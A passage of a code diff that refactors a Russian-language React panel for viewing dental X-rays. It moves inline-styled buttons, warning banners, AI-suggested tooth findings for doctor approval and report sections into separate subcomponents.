-												color: "var(--ink, #f8fafc)",
-												border: "1px solid var(--line, #334155)",
-												boxShadow: "0 1px 2px rgba(0,0,0,0.04)",
-												cursor: "pointer",
-											}}
-										>
-											<FileUp size={14} /> Загрузить DICOM / КТ-архив
-										</span>
-
-										<span
-											role="button"
-											tabIndex={0}
-											data-testid="btn-visiograph-referral"
-											onClick={(e) => {
-												e.stopPropagation();
-												if (onReferToRadiology) {
-													onReferToRadiology();
-												} else {
-													window.dispatchEvent(
-														new CustomEvent("dente-open-radiology-referral", {
-															detail: { toothCode, patientId: effectivePatientId },
-														}),
-													);
-													showToast("Открытие формы направления на рентген-диагностику", "info");
-												}
-											}}
-											onKeyDown={(e) => {
-												if (e.key === "Enter" || e.key === " ") {
-													e.stopPropagation();
-													if (onReferToRadiology) onReferToRadiology();
-												}
-											}}
-											style={{
-												display: "inline-flex",
-												alignItems: "center",
-												gap: "6px",
-												padding: "0 14px",
-												height: "32px",
-												minHeight: "32px",
-												borderRadius: "8px",
-												fontSize: "0.82rem",
-												fontWeight: 500,
-												background: "var(--paper)",
-												color: "var(--ink)",
-												border: "1px solid var(--line)",
-												boxShadow: "0 1px 2px rgba(0,0,0,0.03)",
-												cursor: "pointer",
-											}}
-										>
-											<FileText size={14} /> Направить на рентген
-										</span>
-
-										<span
-											className="btn-primary"
-											style={{
-												display: "inline-flex",
-												alignItems: "center",
-												gap: "6px",
-												padding: "0 14px",
-												height: "32px",
-												minHeight: "32px",
-												borderRadius: "8px",
-												fontSize: "0.82rem",
-												fontWeight: 500,
-												background: "transparent",
-												color: "var(--teal)",
-												border: "1px solid var(--teal)",
-												boxShadow: "0 1px 2px rgba(0,0,0,0.05)",
-												opacity: isAnalyzing ? 0.5 : 1,
-												cursor: "pointer",
-											}}
-										>
-											Выбрать файл
-										</span>
-
-										<span
-											role="button"
-											tabIndex={0}
-											data-testid="btn-load-demo-scan"
-											onClick={(e) => {
-												e.stopPropagation();
-												handleLoadDemoScan();
-											}}
-											onKeyDown={(e) => {
-												if (e.key === "Enter" || e.key === " ") {
-													e.stopPropagation();
-													handleLoadDemoScan();
-												}
-											}}
-											style={{
-												display: "inline-flex",
-												alignItems: "center",
-												gap: "6px",
-												padding: "0 14px",
-												height: "32px",
-												minHeight: "32px",
-												borderRadius: "8px",
-												fontSize: "0.82rem",
-												fontWeight: 500,
-												background: "var(--paper)",
-												color: "var(--muted)",
-												border: "1px dashed var(--line)",
-												boxShadow: "0 1px 2px rgba(0,0,0,0.03)",
-												cursor: "pointer",
-												transition: "all 0.15s ease",
-											}}
-										>
-											Показать демо-снимок
-										</span>
-									</div>
-								</div>
-							)}
-						</button>
-					)}
-
-					{/* Error state */}
-					{error && (
-						<div
-							style={{
-								// БЫЛО: var(--error-surface, #fff0f0) и var(--error, #c62828).
-								// Оба имени не объявлены ни в одной теме, поэтому всегда работал
-								// запас — светло-розовая плашка со светлой темы держалась и в
-								// тёмной, и в ночной. --bad-bg/--bad-fg объявлены во всех трёх
-								// темах; в светлой они дают тот же смысл, что прежние литералы.
-								padding: "12px 16px",
-								background: "var(--bad-bg)",
-								color: "var(--bad-fg)",
-								borderRadius: "10px",
-								display: "flex",
-								alignItems: "flex-start",
-								gap: "10px",
-								fontSize: "0.88rem",
-								marginTop: currentScan ? "0" : "12px",
-							}}
-						>
-							<AlertTriangle
-								size={16}
-								style={{ flexShrink: 0, marginTop: "2px" }}
-							/>
-							<div>
-								<strong>Ошибка анализа</strong>
-								<div style={{ marginTop: "4px" }}>{error}</div>
-							</div>
-							<button
-								type="button"
-								onClick={() => setError(null)}
-								style={{
-									marginLeft: "auto",
-									background: "none",
-									border: "none",
-									cursor: "pointer",
-									color: "inherit",
-								}}
-							>
-								<X size={14} />
-							</button>
-						</div>
-					)}
-
-					{/* Result area */}
-					{currentScan && (
-						<div
-							style={{ display: "flex", flexDirection: "column", gap: "10px" }}
-						>
-							{/* Image viewer & PACS Studio */}
-							{currentImageUrl && (
-								<div
-									style={{
-										display: "flex",
-										flexDirection: "column",
-										gap: "6px",
-									}}
-								>
-									{/* ЕДИНЫЙ КЛИНИЧЕСКИЙ КОКПИТ РВГ (DOMINANT CANVAS & ZERO-SCATTER, 30–34px) */}
-									<div
-										data-testid="visiograph-cockpit-toolbar"
-										style={{
-											display: "flex",
-											alignItems: "center",
-											justifyContent: "space-between",
-											gap: "6px",
-											flexWrap: "wrap",
-											padding: "4px 8px",
-											background: "var(--paper-soft)",
-											border: "1px solid var(--line)",
-											borderRadius: "8px",
-											minHeight: "34px",
-										}}
-									>
-										{/* Левая группа: Фильтры 1-клик и инструменты */}
-										<div style={{ display: "flex", alignItems: "center", gap: "4px", flexWrap: "wrap" }}>
-											<button
-												type="button"
-												onClick={() => setQuickPreset("standard")}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: quickPreset === "standard" ? 700 : 500,
-													background: quickPreset === "standard" ? "var(--teal)" : "transparent",
-													color: quickPreset === "standard" ? "var(--on-teal, white)" : "var(--ink)",
-													border: "1px solid " + (quickPreset === "standard" ? "var(--teal)" : "var(--line)"),
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													transition: "all 0.15s ease",
-												}}
-											>
-												Стандарт
-											</button>
-											<button
-												type="button"
-												onClick={() => setQuickPreset("invert")}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: quickPreset === "invert" ? 700 : 500,
-													background: quickPreset === "invert" ? "var(--teal)" : "transparent",
-													color: quickPreset === "invert" ? "var(--on-teal, white)" : "var(--ink)",
-													border: "1px solid " + (quickPreset === "invert" ? "var(--teal)" : "var(--line)"),
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													transition: "all 0.15s ease",
-												}}
-												title="Негатив для обнаружения микротрещин корня и тонких линий перелома"
-											>
-												Негатив
-											</button>
-											<button
-												type="button"
-												onClick={() => setQuickPreset("endo")}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: quickPreset === "endo" ? 700 : 500,
-													background: quickPreset === "endo" ? "var(--teal)" : "transparent",
-													color: quickPreset === "endo" ? "var(--on-teal, white)" : "var(--ink)",
-													border: "1px solid " + (quickPreset === "endo" ? "var(--teal)" : "var(--line)"),
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													transition: "all 0.15s ease",
-												}}
-												title="Контраст для поиска апикального сужения (WL) и устьев каналов"
-											>
-												Эндо
-											</button>
-											<button
-												type="button"
-												onClick={() => setQuickPreset("bone")}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: quickPreset === "bone" ? 700 : 500,
-													background: quickPreset === "bone" ? "var(--teal)" : "transparent",
-													color: quickPreset === "bone" ? "var(--on-teal, white)" : "var(--ink)",
-													border: "1px solid " + (quickPreset === "bone" ? "var(--teal)" : "var(--line)"),
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													transition: "all 0.15s ease",
-												}}
-												title="Периодонтальная щель, костная ткань и очаги деструкции"
-											>
-												Кость
-											</button>
-											<button
-												type="button"
-												onClick={() => setQuickPreset("enamel")}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: quickPreset === "enamel" ? 700 : 500,
-													background: quickPreset === "enamel" ? "var(--teal)" : "transparent",
-													color: quickPreset === "enamel" ? "var(--on-teal, white)" : "var(--ink)",
-													border: "1px solid " + (quickPreset === "enamel" ? "var(--teal)" : "var(--line)"),
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													transition: "all 0.15s ease",
-												}}
-												title="Высокий контраст для контактных поверхностей и эмалево-дентинной границы"
-											>
-												Эмаль
-											</button>
-
-											<div style={{ width: 1, height: 18, background: "var(--line)", margin: "0 2px" }} />
-
-											{/* Измерительные инструменты */}
-											<button
-												type="button"
-												onClick={() => {
-													setInitialStudioTool("root_canal");
-													setIsStudioMode(true);
-												}}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 9px",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: 600,
-													background: "rgba(16, 185, 129, 0.12)",
-													color: "#059669",
-													border: "1px solid rgba(16, 185, 129, 0.4)",
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													gap: "5px",
-													transition: "all 0.15s ease",
-												}}
-												title="Открыть эндо-линейку для измерения рабочей длины канала (WL, мм) по анатомической кривизне корня"
-											>
-												<Activity size={13} />
-												<span>Эндо-линейка (Апекс)</span>
-											</button>
-											<button
-												type="button"
-												onClick={() => {
-													setInitialStudioTool("pointer");
-													setIsStudioMode((prev) => !prev);
-												}}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 9px",
-													background: isStudioMode ? "var(--teal)" : "transparent",
-													color: isStudioMode ? "var(--on-teal, white)" : "var(--ink)",
-													border: "1px solid " + (isStudioMode ? "var(--teal)" : "var(--line)"),
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: 600,
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													gap: "5px",
-													transition: "all 0.15s ease",
-												}}
-												title="Открыть расширенные инструменты 2D PACS Студии (линейка, углы, калибровка)"
-											>
-												<Sparkles size={13} />
-												<span>{isStudioMode ? "Закрыть PACS" : "Инструменты (PACS)"}</span>
-											</button>
-										</div>
-
-										{/* Правая группа: Клинические действия 1-клик и статус СанПиН */}
-										<div style={{ display: "flex", alignItems: "center", gap: "6px", flexWrap: "wrap" }}>
-											<button
-												type="button"
-												data-testid="btn-visiograph-norma-043"
-												onClick={handleApplyNormaTo043}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													background: isNormaApplied ? "rgba(16, 185, 129, 0.2)" : "var(--paper)",
-													color: isNormaApplied ? "#059669" : "var(--ink)",
-													border: `1px solid ${isNormaApplied ? "#10b981" : "var(--line)"}`,
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: 600,
-													cursor: "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													gap: "5px",
-													transition: "all 0.15s ease",
-												}}
-												title="1-клик в карту 043/у: Норма, патологии на снимке не выявлено (периодонтальная щель равномерная, кортикальная пластинка альвеолы сохранена)"
-											>
-												<CheckCircle2 size={13} style={{ color: "#10b981" }} />
-												<span>{isNormaApplied ? "Норма внесена ✓" : "Норма в 043/у ✓"}</span>
-											</button>
-
-											<button
-												type="button"
-												data-testid="btn-run-visiograph-ai"
-												onClick={handleRunAiAnalysis}
-												disabled={isAnalyzing}
-												style={{
-													height: "30px",
-													minHeight: "30px",
-													padding: "0 10px",
-													background: isAnalyzing ? "var(--paper-soft)" : "var(--teal)",
-													color: isAnalyzing ? "var(--muted)" : "var(--on-teal, white)",
-													border: "1px solid var(--teal)",
-													borderRadius: "6px",
-													fontSize: "0.78rem",
-													fontWeight: 600,
-													cursor: isAnalyzing ? "wait" : "pointer",
-													display: "inline-flex",
-													alignItems: "center",
-													justifyContent: "center",
-													gap: "5px",
-													transition: "all 0.15s ease",
-												}}
-												title="Запустить фоновый ИИ-анализ снимка (нейросеть найдёт кариес, периодонтит, пломбы)"
-											>
-												{isAnalyzing ? (
-													<>
-														<Loader2 size={13} className="animate-spin" />
-														<span>Анализ...</span>
-													</>
-												) : (
-													<>
-														<Sparkles size={13} />
-														<span>
-															{currentScan?.aiReport
-																? "Перезапуск ИИ"
-																: "ИИ-анализ"}
-														</span>
-													</>
-												)}
-											</button>
-
-											{/* Микро-бейдж СанПиН и дозиметрии */}
-											<span
-												style={{
-													fontSize: "0.72rem",
-													color: "var(--muted)",
-													display: "inline-flex",
-													alignItems: "center",
-													gap: "4px",
-													padding: "2px 6px",
-												}}
-												title="Снимок открыт мгновенно (<50мс) в полном разрешении. СанПиН 2.6.1.1192-03."
-											>
-												<span style={{ width: 6, height: 6, borderRadius: "50%", background: "#10b981", display: "inline-block" }} />
-												<span>&lt;50мс · СанПиН 2.6.1</span>
-											</span>
-										</div>
-									</div>
-
-									{isStudioMode ? (
-										<VisiographStudioCanvas
-											imageUrl={currentImageUrl}
-											patientId={effectivePatientId}
-											patientFullName={
-												effectivePatientId
-													? `Пациент #${effectivePatientId}`
-													: undefined
-											}
-											toothCode={currentScan.toothCode}
-											studyId={currentScan.id}
-											initialTool={initialStudioTool}
-											onClose={() => setIsStudioMode(false)}
-										/>
-									) : (
-										<div
-											className="visiograph-dominant-canvas"
-											style={{
-												width: "100%",
-												minHeight: "480px",
-												height: "560px",
-												maxHeight: "72vh",
-												borderRadius: "12px",
-												overflow: "hidden",
-												border: "1px solid var(--glass-border, var(--line))",
-												background: "var(--dark-bg, #0a0e17)",
-												position: "relative",
-												display: "flex",
-												alignItems: "center",
-												justifyContent: "center",
-											}}
-										>
-											<ShadowAnalystImageSlider
-												imageUrl={currentImageUrl}
-												enhanced={true}
-												viewerStyle={{
-													filter:
-														quickPreset === "invert"
-															? "invert(1) contrast(1.3)"
-															: quickPreset === "endo"
-																? "contrast(1.6) brightness(1.15)"
-																: quickPreset === "bone"
-																	? "contrast(1.4) brightness(0.95)"
-																	: quickPreset === "enamel"
-																		? "contrast(1.8) brightness(1.05)"
-																		: undefined,
-													transition: "filter 0.15s ease",
-												}}
-											/>
-										</div>
-									)}
-								</div>
-							)}
-
-							{/* Saving indicator */}
-							{isSaving && (
-								<div
-									style={{
-										fontSize: "0.8rem",
-										color: "var(--muted)",
-										display: "flex",
-										alignItems: "center",
-										gap: "6px",
-									}}
-								>
-									<Loader2 size={12} className="animate-spin" /> Сохранение в
-									карту пациента...
-								</div>
-							)}
-
-							{/*
-							 * Отказ записи в карту. Стоит РЯДОМ с заключением, а не наверху
-							 * панели: врач читает текст разбора и должен здесь же увидеть, что
-							 * в карту он не попал. Цвет — предупреждение (--warn-bg/--warn-fg
-							 * объявлены во всех трёх темах), потому что разбор не потерян,
-							 * он на экране; потеряна только запись.
-							 */}
-							{openFailure && (
-								<div
-									role="alert"
-									data-testid="xray-scan-open-failure"
-									style={{
-										padding: "10px 14px",
-										background: "var(--warn-bg)",
-										color: "var(--warn-fg)",
-										borderRadius: "10px",
-										display: "flex",
-										alignItems: "flex-start",
-										gap: "10px",
-										fontSize: "0.85rem",
-									}}
-								>
-									<AlertTriangle
-										size={16}
-										style={{ flexShrink: 0, marginTop: "2px" }}
-										aria-hidden="true"
-									/>
-									<div>
-										<strong>Снимок не открыт полностью</strong>
-										<div style={{ marginTop: "4px" }}>{openFailure}</div>
-									</div>
-									<button
-										type="button"
-										onClick={() => setOpenFailure(null)}
-										style={{
-											marginLeft: "auto",
-											background: "none",
-											border: "none",
-											cursor: "pointer",
-											color: "inherit",
-										}}
-										aria-label="Скрыть сообщение"
-									>
-										<X size={14} />
-									</button>
-								</div>
-							)}
-
-							{!isSaving && saveFailure && (
-								<div
-									role="alert"
-									style={{
-										padding: "10px 14px",
-										background: "var(--warn-bg)",
-										color: "var(--warn-fg)",
-										borderRadius: "10px",
-										display: "flex",
-										alignItems: "flex-start",
-										gap: "10px",
-										fontSize: "0.85rem",
-									}}
-								>
-									<AlertTriangle
-										size={16}
-										style={{ flexShrink: 0, marginTop: "2px" }}
-										aria-hidden="true"
-									/>
-									<div>
-										<strong>Заключение не сохранено в карту</strong>
-										<div style={{ marginTop: "4px" }}>{saveFailure}</div>
-									</div>
-								</div>
-							)}
-
-							{/*
-							 * Отказ записи В ЗУБНУЮ ФОРМУЛУ — своя плашка, а не общая с
-							 * отказом записи снимка: это две разные записи в карте пациента,
-							 * и врач должен видеть, какая именно не сохранилась. Стоит выше
-							 * счётчика «Внесено в зубную формулу», чтобы отказ читался раньше
-							 * числа.
-							 */}
-							{formulaFailure && (
-								<div
-									role="alert"
-									style={{
-										padding: "10px 14px",
-										background: "var(--warn-bg)",
-										color: "var(--warn-fg)",
-										borderRadius: "10px",
-										display: "flex",
-										alignItems: "flex-start",
-										gap: "10px",
-										fontSize: "0.85rem",
-									}}
-								>
-									<AlertTriangle
-										size={16}
-										style={{ flexShrink: 0, marginTop: "2px" }}
-										aria-hidden="true"
-									/>
-									<div>
-										<strong>Находки не внесены в зубную формулу</strong>
-										<div style={{ marginTop: "4px" }}>{formulaFailure}</div>
-									</div>
-								</div>
-							)}
-
-							{/*
-							 * Непонятые находки. Отдельной строкой и до плашек: врач должен
-							 * узнать, что часть зубов помощник описал так, что в формулу их не
-							 * внесли, — иначе он решит, что снимок разобран целиком.
-							 */}
-							{applyNotice && (
-								<div
-									role="status"
-									style={{
-										padding: "10px 14px",
-										background: "var(--warn-bg)",
-										color: "var(--warn-fg)",
-										borderRadius: "10px",
-										display: "flex",
-										alignItems: "flex-start",
-										gap: "10px",
-										fontSize: "0.85rem",
-									}}
-								>
-									<AlertTriangle
-										size={16}
-										style={{ flexShrink: 0, marginTop: "2px" }}
-										aria-hidden="true"
-									/>
-									<div>{applyNotice}</div>
-								</div>
-							)}
-
-							{/* Tooth states findings & Doctor Approval */}
-							{toothStatesArray.length > 0 && (
-								<div
-									style={{
-										padding: "14px 16px",
-										background: "var(--paper-soft)",
-										borderRadius: "10px",
-										border: "1px solid var(--line)",
-										display: "flex",
-										flexDirection: "column",
-										gap: "12px",
-									}}
-								>
-									<div
-										style={{
-											display: "flex",
-											justifyContent: "space-between",
-											alignItems: "center",
-											flexWrap: "wrap",
-											gap: "8px",
-										}}
-									>
-										<div>
-											<div
-												style={{
-													fontSize: "0.88rem",
-													fontWeight: 700,
-													color: "var(--ink)",
-													display: "flex",
-													alignItems: "center",
-													gap: "6px",
-												}}
-											>
-												<Sparkles size={16} style={{ color: "var(--teal)" }} />
-												<span>Находки ИИ на снимке (рекомендательный список)</span>
-											</div>
-											<div
-												style={{
-													fontSize: "0.78rem",
-													color: "var(--muted)",
-													marginTop: "2px",
-												}}
-											>
-												{isHistoryView
-													? `Зубы из архива: ${toothStatesArray.length} поз.`
-													: appliedToothCodes.length > 0
-														? `Внесено в зубную формулу: ${countLabel(appliedToothCodes.length, "зуб", "зуба", "зубов")} из ${toothStatesArray.length}`
-														: "Отметьте нужные зубы и нажмите «Применить выбранные к формуле»"}
-											</div>
-										</div>
-
-										<div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
-											<button
-												type="button"
-												onClick={() => {
-													const allCodes = toothStatesArray.map((t) => t.code);
-													if (selectedFindingCodes.size === allCodes.length) {
-														setSelectedFindingCodes(new Set());
-													} else {
-														setSelectedFindingCodes(new Set(allCodes));
-													}
-												}}
-												style={{
-													padding: "5px 10px",
-													fontSize: "0.75rem",
-													background: "transparent",
-													color: "var(--muted)",
-													border: "1px solid var(--line)",
-													borderRadius: "6px",
-													cursor: "pointer",
-												}}
-											>
-												{selectedFindingCodes.size === toothStatesArray.length
-													? "Снять выбор"
-													: "Выбрать все"}
-											</button>
-
-											<button
-												type="button"
-												data-testid="btn-apply-findings-to-chart"
-												onClick={handleApplyFindingsToChart}
-												disabled={isApplyingToChart}
-												style={{
-													padding: "6px 14px",
-													background: isApplyingToChart
-														? "var(--line)"
-														: "var(--teal)",
-													color: isApplyingToChart
-														? "var(--muted)"
-														: "var(--on-teal, white)",
-													border: "none",
-													borderRadius: "8px",
-													fontSize: "0.82rem",
-													fontWeight: 700,
-													cursor: isApplyingToChart
-														? "not-allowed"
-														: "pointer",
-													display: "flex",
-													alignItems: "center",
-													gap: "6px",
-													transition: "all 0.2s ease",
-												}}
-												title="Применить выбранные врачом находки ИИ к живой зубной формуле пациента"
-											>
-												{isApplyingToChart ? (
-													<>
-														<Loader2 size={14} className="animate-spin" />
-														<span>Внесение...</span>
-													</>
-												) : (
-													<>
-														<CheckCircle2 size={14} />
-														<span>
-															Применить выбранные к формуле ({selectedFindingCodes.size})
-														</span>
-													</>
-												)}
-											</button>
-										</div>
-									</div>
-
-									<div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
-										{(toothStatesArray ?? []).map(({ code, state }) => {
-											const isCritical =
-												state === "treatment" || state === "watch";
-											const isApplied = appliedToothCodes.includes(code);
-											const isSelected = selectedFindingCodes.has(code);
-
-											return (
-												<label
-													key={code}
-													style={{
-														display: "inline-flex",
-														alignItems: "center",
-														gap: "6px",
-														padding: "5px 12px",
-														borderRadius: "8px",
-														fontSize: "0.82rem",
-														fontWeight: 600,
-														background: isApplied
-															? "var(--teal-soft)"
-															: isSelected
-																? "var(--paper)"
-																: "var(--paper-soft)",
-														color: isApplied
-															? "var(--teal)"
-															: isCritical
-																? "var(--rust, #c62828)"
-																: "var(--ink)",
-														border: `1px solid ${
-															isApplied
-																? "var(--teal)"
-																: isSelected
-																	? "var(--teal)"
-																	: "var(--line)"
-														}`,
-														cursor: "pointer",
-														userSelect: "none",
-														transition: "all 0.15s ease",
-													}}
-												>
-													<input
-														type="checkbox"
-														checked={isSelected}
-														onChange={(e) => {
-															const next = new Set(selectedFindingCodes);
-															if (e.target.checked) next.add(code);
-															else next.delete(code);
-															setSelectedFindingCodes(next);
-														}}
-														style={{ cursor: "pointer" }}
-													/>
-													<span>Зуб {code}</span>
-													<span style={{ opacity: 0.8, fontWeight: 400 }}>
-														· {STATE_LABELS[state] ?? state}
-													</span>
-													{isApplied && (
-														<span
-															style={{
-																fontSize: "0.7rem",
-																fontWeight: 700,
-																background: "var(--teal)",
-																color: "var(--on-teal, white)",
-																padding: "1px 6px",
-																borderRadius: "4px",
-																marginLeft: "4px",
-															}}
-														>
-															Внесено
-														</span>
-													)}
-												</label>
-											);
-										})}
-									</div>
-								</div>
-							)}
-
-							{/* AI Report sections */}
-							{reportSections.length > 0 && (
-								<div
-									style={{
-										border: "1px solid var(--line)",
-										borderRadius: "10px",
-										overflow: "hidden",
-									}}
-								>
-									<div
-										style={{
-											padding: "10px 14px",
-											background: "var(--paper-soft)",
-											display: "flex",
-											alignItems: "center",
-											gap: "8px",
-											borderBottom: "1px solid var(--line)",
-										}}
-									>
-										<Sparkles size={14} style={{ color: "var(--teal)" }} />
-										<span style={{ fontWeight: 600, fontSize: "0.88rem" }}>
-											Полный отчёт рентген-анализа ИИ
-										</span>
-										<span
-											style={{
-												fontSize: "0.78rem",
-												color: "var(--muted)",
-												marginLeft: "auto",
-											}}
-										>
-											{new Date(currentScan.capturedAt).toLocaleDateString(
-												"ru-RU",
+											{isAnalyzing ? (
+												<>
+													<Loader2 size={13} className="animate-spin" />
+													<span>Анализ...</span>
+												</>
+											) : (
+												<>
+													<Sparkles size={13} />
+													<span>{currentScan?.aiReport ? "Перезапуск ИИ" : "ИИ-анализ"}</span>
+												</>
 											)}
+										</button>
+
+										<span style={sanPinBadgeStyle}>
+											<span style={{ width: 6, height: 6, borderRadius: "50%", background: "#10b981", display: "inline-block" }} />
+											<span>&lt;50мс · СанПиН 2.6.1</span>
 										</span>
 									</div>
-									{(reportSections ?? []).map((section, sIndex) => (
-										<div
-											key={
-												section.title ||
-												`section-${section.content.slice(0, 10)}`
-											}
-											style={{
-												borderBottom:
-													sIndex < reportSections.length - 1
-														? "1px solid var(--line)"
-														: "none",
-											}}
-										>
-											<button
-												type="button"
-												onClick={() =>
-													setActiveSection(
-														activeSection === sIndex ? null : sIndex,
-													)
-												}
-												style={{
-													width: "100%",
-													textAlign: "left",
-													padding: "10px 14px",
-													background:
-														activeSection === sIndex
-															? "var(--paper-soft)"
-															: "transparent",
-													border: "none",
-													cursor: "pointer",
-													display: "flex",
-													alignItems: "center",
-													gap: "8px",
-													transition: "background 0.15s",
-												}}
-											>
-												<section.icon size={16} style={{ color: "var(--teal)", flexShrink: 0 }} aria-hidden="true" />
-												<span
-													style={{
-														fontWeight: 600,
-														fontSize: "0.88rem",
-														flex: 1,
-													}}
-												>
-													{section.title}
-												</span>
-												<ChevronDown
-													size={14}
-													style={{
-														transform:
-															activeSection === sIndex
-																? "rotate(180deg)"
-																: "none",
-														transition: "transform 0.2s",
-														color: "var(--muted)",
-													}}
-												/>
-											</button>
-											{activeSection === sIndex && (
-												<div
-													style={{
-														padding: "8px 14px 14px 34px",
-														fontSize: "0.87rem",
-														lineHeight: 1.65,
-														color: "var(--ink)",
-													}}
-													// biome-ignore lint/security/noDangerouslySetInnerHtml: content sanitized via escapeHtml() before renderMarkdown()
-													dangerouslySetInnerHTML={{
-														__html: renderMarkdown(section.content),
-													}}
-												/>
-											)}
-										</div>
-									))}
 								</div>
-							)}
 
-							{/* New scan / delete-from-archive actions */}
-							<div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
-								<button
-									type="button"
-									onClick={handleClear}
-									style={{
-										display: "flex",
-										alignItems: "center",
-										gap: "8px",
-										justifyContent: "center",
-										padding: "9px 20px",
-										borderRadius: "8px",
-										cursor: "pointer",
-										fontSize: "0.88rem",
-										background: "transparent",
-										border: "1px solid var(--line)",
-										color: "var(--muted)",
-										transition: "all 0.2s",
-									}}
-								>
-									<UploadCloud size={14} />
-									Загрузить другой снимок
-								</button>
-								{isHistoryView && currentScan && (
-									<button
-										type="button"
-										data-testid="xray-scan-delete-current"
-										aria-label="Удалить открытый снимок из архива"
-										disabled={deletingScanId === currentScan.id}
-										onClick={() => void deleteScan(currentScan)}
-										style={{
-											display: "flex",
-											alignItems: "center",
-											gap: "8px",
-											justifyContent: "center",
-											padding: "9px 20px",
-											borderRadius: "8px",
-											fontSize: "0.88rem",
-											background: "transparent",
-											border: "1px solid var(--rust, #c62828)",
-											color: "var(--rust, #c62828)",
-											cursor:
-												deletingScanId === currentScan.id ? "wait" : "pointer",
-											opacity: deletingScanId === currentScan.id ? 0.7 : 1,
-										}}
-									>
-										{deletingScanId === currentScan.id ? (
-											<Loader2
-												size={14}
-												className="animate-spin"
-												aria-hidden="true"
-											/>
-										) : (
-											<Trash2 size={14} aria-hidden="true" />
-										)}
-										Удалить из архива
-									</button>
-								)}
-							</div>
-							{deleteFailure && isHistoryView && (
-								<div
-									role="alert"
-									data-testid="xray-scan-delete-failure-current"
-									style={{
-										padding: "8px 12px",
-										background: "var(--warn-bg)",
-										color: "var(--warn-fg)",
-										borderRadius: "8px",
-										fontSize: "0.82rem",
-									}}
-								>
-									{deleteFailure}
-								</div>
-							)}
-						</div>
-					)}
-
-					{/* Архив снимков: загрузка / отказ / пусто / список — четыре разных
-              вида вместо прежних двух («список» и «ничего», куда попадал и
-              отказ сервера). */}
-					{!currentScan && effectivePatientId && historyPhase === "loading" && (
-						<div
-							style={{
-								marginTop: "16px",
-								fontSize: "0.85rem",
-								color: "var(--muted)",
-								display: "flex",
-								alignItems: "center",
-								gap: "6px",
-							}}
-						>
-							<Loader2 size={13} className="animate-spin" />
-							{panelStateText(SCAN_ARCHIVE_SUBJECT, { phase: "loading" }).title}
-						</div>
-					)}
-
-					{!currentScan &&
-						effectivePatientId &&
-						historyPhase === "failed" &&
-						historyFailure && (
-							<div style={{ marginTop: "16px" }}>
-								<PanelLoadFailure
-									subject={SCAN_ARCHIVE_SUBJECT}
-									status={historyFailure.status}
-									onRetry={() => loadHistory(effectivePatientId)}
+								{/* Viewport */}
+								<VisiographViewport
+									isStudioMode={isStudioMode}
+									currentImageUrl={currentImageUrl}
+									effectivePatientId={effectivePatientId}
+									currentScan={currentScan}
+									initialStudioTool={initialStudioTool}
+									quickPreset={quickPreset}
+									onCloseStudio={() => setIsStudioMode(false)}
 								/>
 							</div>
 						)}
 
-					{/* Честная пустота. Что делать дальше, уже написано в зоне загрузки
-              выше, поэтому подсказка здесь не повторяется — иначе на одном
-              экране два раза сказано одно и то же. */}
-					{!currentScan && effectivePatientId && historyPhase === "empty" && (
-						<div
-							style={{
-								marginTop: "16px",
-								fontSize: "0.82rem",
-								color: "var(--muted)",
+						{/* Saving indicator */}
+						{isSaving && (
+							<div style={{ fontSize: "0.8rem", color: "var(--muted)", display: "flex", alignItems: "center", gap: "6px" }}>
+								<Loader2 size={12} className="animate-spin" /> Сохранение в карту пациента...
+							</div>
+						)}
+
+						{/* Tooth findings approval */}
+						<VisiographFindingsSection
+							toothStates={toothStatesArray}
+							appliedToothCodes={appliedToothCodes}
+							isHistoryView={isHistoryView}
+							selectedFindingCodes={selectedFindingCodes}
+							onToggleFindingCode={(code) => {
+								const next = new Set(selectedFindingCodes);
+								if (next.has(code)) next.delete(code);
+								else next.add(code);
+								setSelectedFindingCodes(next);
 							}}
-						>
-							{panelStateText(SCAN_ARCHIVE_SUBJECT, { phase: "empty" }).title}
-						</div>
-					)}
-
-					{!currentScan && historyPhase === "ready" && (
-						<div style={{ marginTop: "16px" }}>
-							<button
-								type="button"
-								onClick={() => setHistoryExpanded(!historyExpanded)}
-								style={{
-									display: "flex",
-									alignItems: "center",
-									gap: "6px",
-									background: "none",
-									border: "none",
-									cursor: "pointer",
-									fontSize: "0.85rem",
-									color: "var(--muted)",
-									padding: "4px 0",
-									fontWeight: 500,
-								}}
-							>
-								<History size={14} />
-								История снимков ({scanHistory.length})
-								<ChevronDown
-									size={13}
-									style={{
-										transform: historyExpanded ? "rotate(180deg)" : "none",
-										transition: "transform 0.2s",
-									}}
-								/>
-							</button>
-							{historyExpanded && (
-								<div
-									style={{
-										marginTop: "8px",
-										display: "flex",
-										flexDirection: "column",
-										gap: "6px",
-										maxHeight: "240px",
-										overflowY: "auto",
